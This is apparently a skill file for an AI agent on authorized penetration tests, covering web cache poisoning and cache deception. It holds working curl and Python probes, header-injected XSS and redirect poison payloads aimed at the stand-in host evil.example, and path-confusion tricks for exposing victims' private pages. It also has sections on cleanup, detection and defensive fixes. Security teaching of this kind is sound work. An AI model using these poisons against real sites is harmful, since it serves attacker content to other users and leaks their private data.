---
name: cache-poisoning
description: Use when testing web cache poisoning and web cache deception on
  an authorized engagement. Covers detecting cache layers via headers and
  timing, finding unkeyed inputs (headers, cookies, query parameters),
  poisoning cached responses with reflected XSS payloads or redirects, web
  cache deception with path confusion and static extensions, and confirming
  victim impact with a second session. Use when the target sits behind a CDN
  or reverse proxy cache, when responses include Age or X-Cache headers, or
  when unkeyed input is reflected in cached pages.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-xss, webapp-pentest-methodology]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

Web cache poisoning tricks a cache into storing an attacker-crafted
response under a normal URL, so every later visitor receives the
attacker's content from the trusted domain. Web cache deception is its
sibling: path confusion makes the cache store a victim's private page
under a URL the attacker can fetch. Both turn one request into impact
on many users. This skill covers the authorized methodology: detecting
caches, finding unkeyed inputs, crafting poisons, confirming victim
impact, and handling cache state responsibly. All testing targets
systems you have written permission to test. Poisoning affects other
users by design, so keep payloads benign, TTLs short, and coordinate
every step with the client.

## Quick Workflow

1. Detect the cache: response headers (`Age`, `X-Cache`, `CF-Cache-Status`),
   timing differences, and cache-buster behavior.
2. Map which inputs are part of the cache key and which are unkeyed:
   vary headers, cookies, and query parameters one at a time.
3. Find an unkeyed input that is reflected in the response (header
   reflection, error pages, redirect targets).
4. Craft a poison: XSS payload or redirect in the unkeyed input, sent
   with a cache buster so your request populates the cache.
5. Confirm the poison: fetch the same URL from a clean second session
   and verify the malicious content is served from cache.
6. Test web cache deception: path confusion tricks that store private
   pages under attacker-fetchable URLs.
7. Purge or expire every poisoned entry and confirm the cache is clean.
8. Record the cache key structure, the unkeyed input, and the victim
   session evidence for the report.

## 1. Detecting the cache layer

Establish that a cache sits in front of the application and learn its
tells.

```bash
# Header tells: Age, X-Cache, CF-Cache-Status, X-Served-By
curl -si 'https://target.example/' | grep -iE '^(age|x-cache|cf-cache-status|x-served-by|via):'

# Timing tell: first request slow, immediate repeat fast
for i in 1 2; do
  curl -s -o /dev/null -w "run $i: %{time_total}s\n" 'https://target.example/static/app.js'
done
```

```bash
# Cache-buster tell: same path with a random query string bypasses cache
curl -s -o /dev/null -w 'plain: %{time_total}s\n' 'https://target.example/'
curl -s -o /dev/null -w 'buster: %{time_total}s\n' 'https://target.example/?cb=928374'
```

If the busted URL is consistently slower and lacks `Age`, the
unbusted URL is cached. Note the cache's default behavior for query
strings: some caches key on the full query, some ignore it, and that
choice shapes every later test.

## 2. Finding unkeyed inputs

An unkeyed input reaches the application but is not part of the cache
key, so the cache stores one response for many different values of
that input. Test each candidate input: send two requests that differ
only in that input and see whether the second is served from cache.

```bash
# Candidate unkeyed headers: X-Forwarded-Host, X-Forwarded-Proto,
# X-Original-URL, X-Rewrite-URL, User-Agent, Cookie, Referer
for h in 'X-Forwarded-Host: evil.example' 'X-Forwarded-Proto: http' \
         'X-Original-URL: /evil' 'User-Agent: PoisonProbe/1.0'; do
  echo "== $h =="
  curl -s -D - -o /dev/null "https://target.example/?cb=$RANDOM" \
    -H "$h" | grep -iE '^(age|x-cache):'
done
```

```bash
# Cookie test: does changing a cookie still hit the cached page?
curl -s -D - -o /dev/null 'https://target.example/?cb=111' \
  -b 'probe=A' | grep -iE '^(age|x-cache):'
curl -s -D - -o /dev/null 'https://target.example/?cb=111' \
  -b 'probe=B' | grep -iE '^(age|x-cache):'
# Second request showing Age / HIT means the cookie is unkeyed
```

```python
#!/usr/bin/env python3
"""Unkeyed-input finder (authorized targets only)."""
import urllib.request, random

BASE = "https://target.example/"
CANDIDATES = {
    "X-Forwarded-Host": "evil.example",
    "X-Forwarded-Proto": "http",
    "X-Original-URL": "/poisoned",
    "X-Rewrite-URL": "/poisoned",
    "User-Agent": "PoisonProbe/1.0",
    "Referer": "https://evil.example/",
}
for header, value in CANDIDATES.items():
    cb = f"?cb={random.randint(100000, 999999)}"
    r1 = urllib.request.Request(BASE + cb, headers={header: value})
    with urllib.request.urlopen(r1, timeout=10) as resp:
        age = resp.headers.get("Age")
        body1 = resp.read()
    # Same cache buster, different header value: cache hit means unkeyed
    r2 = urllib.request.Request(BASE + cb, headers={header: "other.example"})
    with urllib.request.urlopen(r2, timeout=10) as resp:
        hit = resp.headers.get("Age") is not None
    print(f"{header:20} cached-on-first={age is not None} unkeyed={hit}")
```

Any input flagged unkeyed becomes the poisoning vehicle in section 4.

## 3. Confirming reflection of the unkeyed input

A poison needs the unkeyed input to appear in the response. Common
reflections: `X-Forwarded-Host` in password reset links and absolute
URLs, `X-Forwarded-Proto` in canonical tags, weird headers in verbose
error pages.

```bash
# Does X-Forwarded-Host reflect into the page?
curl -s 'https://target.example/?cb=222' \
  -H 'X-Forwarded-Host: evil.example' | grep -o 'evil\.example' | head -5

# Does it land in a link or redirect target?
curl -s -D - 'https://target.example/login?cb=333' \
  -H 'X-Forwarded-Host: evil.example' | grep -iE '^(location):|evil\.example' | head -5
```

```bash
# Fat GET: some caches forward a GET body to the app while ignoring it
# for the key; test whether body content reflects
curl -s -X GET 'https://target.example/?cb=444' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'q=<script>alert(1)</script>' | grep -o 'alert(1)' | head -3
```

Reflection plus unkeyed equals a poisonable response. No reflection
means the input is unkeyed but useless; keep hunting.

## 4. Crafting and planting the poison

Send the malicious request with a fresh cache buster so the cache
stores your crafted response under the shared key.

```bash
# XSS poison via reflected X-Forwarded-Host (benign alert payload)
CB="cb=$(date +%s)"
curl -s "https://target.example/?$CB" \
  -H 'X-Forwarded-Host: evil.example"><script>alert(1)</script>' \
  -o /tmp/poison.html
grep -o 'alert(1)' /tmp/poison.html | head -2
```

```bash
# Redirect poison: unkeyed X-Forwarded-Host reflected into Location
curl -s -D - -o /dev/null "https://target.example/login?cb2=$(date +%s)" \
  -H 'X-Forwarded-Host: evil.example' | grep -i '^location:'
```

Keep the payload benign: `alert(document.domain)` or a redirect to
your own test domain. Never plant credential harvesters, crypto
miners, or defacement content, even briefly. Note the exact cache
buster value; you will need it to verify and to purge.

## 5. Confirming victim impact

Fetch the poisoned URL from a clean session: different browser, no
cookies, different IP if possible. The response must come from cache
(`Age` present or `X-Cache: HIT`) and contain your payload.

```bash
# Victim session: no cookies, plain request to the poisoned URL
curl -s 'https://target.example/?cb=<your-buster>' \
  -H 'User-Agent: Mozilla/5.0 (victim-simulation)' \
  -D /tmp/victim-headers.txt -o /tmp/victim-body.html
grep -iE '^(age|x-cache):' /tmp/victim-headers.txt
grep -o 'alert(1)' /tmp/victim-body.html | head -2
```

The evidence bundle: your planting request, the victim request showing
a cache HIT, and the payload present in the victim body. If the cache
varies on something you missed (a cookie, the User-Agent), the victim
fetch misses the poison; go back to section 2 and re-map the key.

## 6. Web cache deception

Deception stores the victim's private page in the cache under a URL
the attacker controls. The trick is path confusion: a URL the cache
treats as static but the application treats as dynamic.

```bash
# Path confusion probes: cache sees a .css file, app serves /account
for p in '/account/evil.css' '/account;.css' '/account%2f..%2fevil.css' \
         '/account%00.css' '/nonexistent.css/../../account'; do
  echo "== $p"
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -b 'session=YOUR_TEST_SESSION' "https://target.example$p")
  ctype=$(curl -s -o /dev/null -w '%{content_type}' \
    -b 'session=YOUR_TEST_SESSION' "https://target.example$p")
  echo "  $code $ctype"
done
```

```bash
# When a probe returns 200 with the account page content under a .css URL:
# 1. Victim (logged in) visits https://target.example/account/evil.css
# 2. Cache stores their private page under that URL
# 3. Attacker (no session) fetches the same URL and reads the victim's data
curl -s 'https://target.example/account/evil.css' | grep -oiE \
  '([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})' | head -5
```

Also test the `Accept` header variant: some caches key on file
extension only and ignore content negotiation, so requesting a private
API path with an image extension poisons the same way. Confirm with
your own two test accounts (victim and attacker) and never with real
user data.

## 7. Cleaning up the cache

Every poisoned entry must be purged before you finish. Coordinate with
the client on the purge method.

```bash
# Option A: the client purges by URL or surrogate key (preferred)
# Option B: wait out the TTL you measured in section 1, then verify
sleep 5  # placeholder: replace with the real TTL wait
curl -s 'https://target.example/?cb=<your-buster>' \
  | grep -c 'alert(1)' || echo "poison gone"
```

```bash
# Verify cleanliness from the victim session too
curl -s 'https://target.example/?cb=<your-buster>' \
  -H 'User-Agent: Mozilla/5.0 (victim-simulation)' | grep -c 'alert(1)' \
  || echo "victim view clean"
```

Do not end the engagement with poisoned entries live. If you cannot
purge, escalate to the client immediately rather than leaving the
cache dirty.

## Edge cases

- Multiple cache layers (CDN plus reverse proxy): each has its own
  key rules. Poison may stick at one layer and miss at the other;
  test from outside the CDN to isolate layers.
- The cache respects `Cache-Control: no-store` on the poison response:
  some poisons never store. Check the response headers on your
  planting request.
- Authenticated responses are cached per session cookie: the poison
  only affects users sharing the exact cookie value, which limits
  impact but is still a finding.
- Query string busters are part of the key: your poison only affects
  the exact buster URL. Use a buster-free plant (relying on TTL
  expiry) when you need the bare URL poisoned.
- The application sets `Vary: X-Forwarded-Host`: the header becomes
  keyed and the attack fails. Verify Vary before claiming unkeyed.
- WAF strips suspicious headers before the app sees them: the
  reflection test in section 3 distinguishes this from a real negative.

## Escalation

- One unkeyed input reflects weakly (inside a comment): chain with
  cache deception so the stored page is the victim's own data, which
  needs no XSS at all.
- XSS poison is filtered: pivot to redirect poisoning via the same
  unkeyed input, or to a stored open redirect the cache will serve.
- The cache ignores your header: try parameter cloaking (a query
  parameter the cache strips but the app reads, such as `?x=1&utm=`
  variants) and semicolon parameters (`;evil=1`).
- Deception path tricks fail: try encoded slashes, dot segments, and
  trailing static extensions on API paths (`/api/me/x.png`).
- Impact seems limited to one region or PoP: document the PoP from
  response headers; regional impact is still impact.

## Detection and defender view

Defenders see cache poisoning as cache HIT responses carrying
unexpected content (script tags, foreign domains in Location
headers), spikes in cache-buster query parameters from one IP, and
private data appearing under static-asset URLs in cache logs. The
durable fixes are including every reflected input in the cache key
(or stripping it at the edge), adding `Vary` correctly, never
reflecting `X-Forwarded-Host`-style headers into responses, disabling
caching for responses that vary by unkeyed input, normalizing URLs
before the cache key is computed (to kill path confusion), and
separating static and dynamic content onto different cache rules.
Purging capability and cache access logs turn incidents from mysteries
into timelines.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the entry
  point class.
- CWE-20 (Improper Input Validation): unkeyed input reflection.
- CWE-444 (Inconsistent Interpretation of HTTP Requests): the class
  behind desync-assisted poisoning.
- CWE-639 (Authorization Bypass Through User-Controlled Key): cache
  deception exposing private pages.
- PortSwigger research by James Kettle: Web Cache Poisoning and Web
  Cache Deception methodology.
- PortSwigger Web Security Academy: web cache poisoning and web cache
  deception labs.
- RFC 7234 (HTTP Caching): Vary, Age, and cache key semantics.
